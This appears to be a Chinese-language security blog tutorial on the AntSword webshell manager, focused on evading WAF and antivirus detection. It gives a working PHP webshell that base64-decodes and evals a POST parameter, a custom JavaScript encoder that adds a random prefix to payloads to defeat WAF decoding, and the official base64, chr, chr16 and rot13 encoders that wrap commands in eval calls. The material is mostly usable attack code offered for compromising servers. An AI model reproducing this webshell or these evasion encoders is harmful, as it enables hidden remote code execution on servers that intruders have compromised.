## 0x001 前  

蚁剑采用了Electron打包作为外壳，ES6 ，dhtmlx，Nodejs
作为前端代码编写语言，搭配Babel&&Webpack进行组件化构建编译，外加iconv-lite编码解码模块以及superagent数据发送处理模块还有nedb数据存储模块，从2.0版本开始，引入了加载器这一概念。用户/开发者只需要下载对应平台的加载器，无需安装额外的环境，即可对源代码进行编辑/执行/调试等操作。可直接运行当前最新的开发版和发行版源代码。

![1652346621_627ccefd752d52910b8e2.png!small](https://image.3001.net/images/20220512/1652346621_627ccefd752d52910b8e2.png!small)

## 0x002 模块介绍

![1652346626_627ccf02c0ecfacc1494e.png!small](https://image.3001.net/images/20220512/1652346626_627ccf02c0ecfacc1494e.png!small)

## 0x003 动态免杀

首先要谈下antSword的自定义编码器，打开蚁剑的系统设置就可以看到编码管理选项,这里选择新增一个编码器。

![1652346631_627ccf077fd3e4203a647.png!small](https://image.3001.net/images/20220512/1652346631_627ccf077fd3e4203a647.png!small)

点击新增编码器，命名之后点击编辑，可以通过代码和注释看出编码器的作用，这些代码主要就是javascript node.js基础语法。

![1652346638_627ccf0e0f6fd807ed43c.png!small](https://image.3001.net/images/20220512/1652346638_627ccf0e0f6fd807ed43c.png!small)

然后我们修改一下代码，随机字符串+传输数据base64 这样的结果是干扰一些waf进行模糊解码,这样是不可能被直接解密。

    
    
    /**
     * php::base64编码器
     * Create at: 2022/03/28 10:32:13
     */
    
    'use strict';
    
    /*
    * @param  {String} pwd   连接密码
    * @param  {Array}  data  编码器处理前的 payload 数组
    * @return {Array}  data  编码器处理后的 payload 数组
    */
    module.exports = (pwd, data, ext={}) => {
      // ##########    请在下方编写你自己的代码   ###################
      // 以下代码随机字符串+传输数据base64
      
      //生成13位随机字符串
      let randomID = `${Math.random().toString(16).substr(2)}`;
      console.log("aaaaaaaaa")
      console.log("a:"+Math.random())
      console.log("aaaaaaaaa")
      //0.6777933515637071
      
      //Math.random()输出0到1(包括0，不包含1)的随机数。toString(16)将随机数转换为16进制的字符串。substr(2)截取字符串，因为随机数大于等于0小于1，前两位是“0.”，substring(2)从第三位开始截取到最后。
      
      console.log("AAAAAAAAAAAAAAAAAAAAAAAA")
      console.log("randomID:"+randomID)
      console.log("AAAAAAAAAAAAAAAAAAAAAAAA")
      // 传输数据base64
      let encry= new Buffer(data['_']).toString('base64');
      console.log("BBBBBBBBBBBBBBBBBBBBBBBBBBB")
      console.log("encry:"+encry)
      console.log("BBBBBBBBBBBBBBBBBBBBBBBBBBB")
      //随机字符串+传输数据base64
      data[pwd] = `${randomID}`+encry;
      console.log("CCCCCCCCCCCCCCCCCCCCCCCC")
      console.log(" data[pwd]:"+ data[pwd])
      console.log("CCCCCCCCCCCCCCCCCCCCCCCC")
    
      // 删除 _ 原有的payload
      delete data['_'];
      // 返回编码器处理后的 payload 数组
      return data;
      
      
      // 生成一个随机变量名
      //let randomID = `_0x${Math.random().toString(16).substr(2)}`;
      // 原有的 payload 在 data['_']中
      // 取出来之后，转为 base64 编码并放入 randomID key 下
      //data[randomID] = Buffer.from(data['_']).toString('base64');
    
      // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
      //data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
    
      // ##########    请在上方编写你自己的代码   ###################
    
      // 删除 _ 原有的payload
      //delete data['_'];
      // 返回编码器处理后的 payload 数组
     // return data;
    }

知识点 ：

Math.random()输出0到1(包括0，不包含1)的随机数。

toString(16)将随机数转换为16进制的字符串。

substr(2)截取字符串，因为随机数大于等于0小于1，前两位是“0.”，substring(2)从第三位开始截取到最后。

弄好蚁剑端的加密，还需要设置文件木马的格式，配合蚁剑，此时上传的木马应该是这种格式，先写一个demo

    
    
    <?php 
    $a = base64_decode(substr($_POST['cmd'],13));
    @eval($a);
    ?>

然后我们设置下AntantSword的代理设置为http,burp监听端口查看下结果。

![1652346646_627ccf169f38a611a09d1.png!small](https://image.3001.net/images/20220512/1652346646_627ccf169f38a611a09d1.png!small)

配置好shell,然后连接shell,再查看burp的流量，设置使用form表单的方式发包，也可以使用multipart方式发包。

![1652346651_627ccf1b85c4e26a9ff86.png!small](https://image.3001.net/images/20220512/1652346651_627ccf1b85c4e26a9ff86.png!small)

我们看一下流量上的效果图：![1652346656_627ccf20b98feece062dc.png!small](https://image.3001.net/images/20220512/1652346656_627ccf20b98feece062dc.png!small)

通过在js中打印在页面中输出和burp上看到http的流量数据。

## 0x004 官方编码

在蚁剑自带的编码器中，存在base64、chr、chr16、rot13四种编码器，此外，官方还提供了一些其他另类的编码器。

![1652346662_627ccf261716757d778b0.png!small](https://image.3001.net/images/20220512/1652346662_627ccf261716757d778b0.png!small)

#### 0x1 base64编码

    
    
    /**
     * php::base64编码器
     * ? 利用php的base64_decode进行编码处理
     */
    
    'use strict';
    
    module.exports = (pwd, data, ext = null) => {
      // 生成一个随机变量名
      let randomID;
      if (ext.opts.otherConf['use-random-variable'] === 1) {
        randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
      } else {
        randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
      }
      data[randomID] = Buffer
        .from(data['_'])
        .toString('base64');
      data[pwd] = `@eval(@base64_decode($_POST['${randomID}']));`;
      delete data['_'];
      return data;
    }
    --------------------------------------------------------------------    /**
     * php::base64解码器
     */
    
    'use strict';
    
    module.exports = {
      /**
       * @returns {string} asenc 将返回数据base64编码
       */
      asoutput: () => {
        return `function asenc($out){
          return @base64_encode($out);
        }
        `.replace(/\n\s+/g, '');
      },
      /**
       * 解码 Buffer
       * @param {Buffer} buff 要被解码的 Buffer
       * @returns {Buffer} 解码后的 Buffer
       */
      decode_buff: (buff) => {
        return Buffer.from(buff.toString(), 'base64');
      }
    }

#### 0x2 chr编码

    
    
    /**
     * php::chr编码器
     * ? 利用php的chr函数进行编码处理
     */
    
    'use strict'
    
    module.exports = (pwd, data, ext = null) => {
      // 编码函数
      const encode = (php) => {
        let ret = [];
        let i = 0;
        while (i < php.length) {
          ret.push(php[i].charCodeAt());
          i++;
        }
        return `@eVAl(cHr(${ret.join(').ChR(')}));`;
      }
    
      // 编码并去除多余数据
      data[pwd] = encode(data._);
      delete data._;
    
      // 返回数据
      return data;
    }

#### 0x3 chr16编码

    
    
    /**
     * php::chr16编码器
     * ? 利用php的chr函数进行编码处理
     */
    
    'use strict'
    
    module.exports = (pwd, data, ext = null) => {
      // 编码函数
      const encode = (php) => {
        let ret = [];
        let i = 0;
        while (i < php.length) {
          ret.push(php[i].charCodeAt().toString(16));
          i++;
        }
        return `@eVAl(cHr(0x${ret.join(').ChR(0x')}));`;
      }
    
      // 编码并去除多余数据
      data[pwd] = encode(data._);
      delete data._;
    
      // 返回数据
      return data;
    }

#### 0x4 rot13编码

    
    
    /**
     * php::str_rot13编码器
     * ? 利用php的 rot13 进行编码处理
     */
    
    'use strict';
    
    module.exports = (pwd, data, ext = null) => {
      const encode = (s) => {
        //use a Regular Expression to Replace only the characters that are a-z or A-Z
        return s.replace(/[a-zA-Z]/g, function (c) {
          // Get the character code of the current character and add 13 to it If it is
          // larger than z's character code then subtract 26 to support wrap around.
          return String.fromCharCode((c <= "Z" ?
              90 :
              122) >= (c = c.charCodeAt(0) + 13) ?
            c :
            c - 26);
        });
      }
    
      // 生成一个随机变量名
      let randomID;
      if (ext.opts.otherConf['use-random-variable'] === 1) {
        randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
      } else {
        randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
      }
      data[randomID] = encode(data['_']);
      data[pwd] = `@eval(@str_rot13($_POST['${randomID}']));`;
      delete data['_'];
      return data;
    }
    ------------------------------------------------------------------------    /**
     * php::base64解码器
     * ? 利用php的base64_decode进行解码处理
     */
    
    'use strict';
    const rot13encode = (s) => {
      //use a Regular Expression to Replace only the characters that are a-z or A-Z
      return s.replace(/[a-zA-Z]/g, function (c) {
        // Get the character code of the current character and add 13 to it If it is
        // larger than z's character code then subtract 26 to support wrap around.
        return String.fromCharCode((c <= "Z" ?
            90 :
            122) >= (c = c.charCodeAt(0) + 13) ?
          c :
          c - 26);
      });
    };
    
    module.exports = {
      asoutput: (tag_s, tag_e) => {
        return `function asenc($out){
          return str_rot13($out);
        }
        `.replace(/\n\s+/g, '');
      },
      decode_buff: (buff) => {
        return Buffer.from(rot13encode(buff.toString()));
      }
    }

